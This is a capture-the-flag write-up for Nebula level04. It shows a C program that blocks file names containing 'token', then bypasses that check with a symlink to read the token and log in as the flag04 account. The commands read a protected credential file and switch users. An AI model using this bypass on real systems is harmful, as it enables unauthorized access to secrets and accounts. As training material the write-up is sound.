## Challenge
This level requires you to read the token file, but the code restricts the files that can be read.

Find a way to bypass it :)

## Solution
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```
Let's analyze the code:
1. **Fail** if no argument (filename) supplied
2. **Fail** if filename contains the string "token"
3. Open filename for reading
4. **Fail** if file can't open
5. Read 1024 bytes to `buf`
6. **Fail** if can't read file
7. Write `buf` to `stdout`

To bypass this protection we can create a `symlink` to `token` and name it something else.
```console
ln -s /home/flag04/token /home/level04/tkn
```
Now we will pass the symlink filename as the argument.
```console
level04@nebula:/home/flag04$ ./flag04 /home/level04/tkn
06508b5e-8909-4f38-b630-fdb148a848a2
```
Yay! use the token to login to flag04, and `getflag` as usual.
```console
level04@nebula:/home/flag04$ su flag04
Password: [enter token]
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
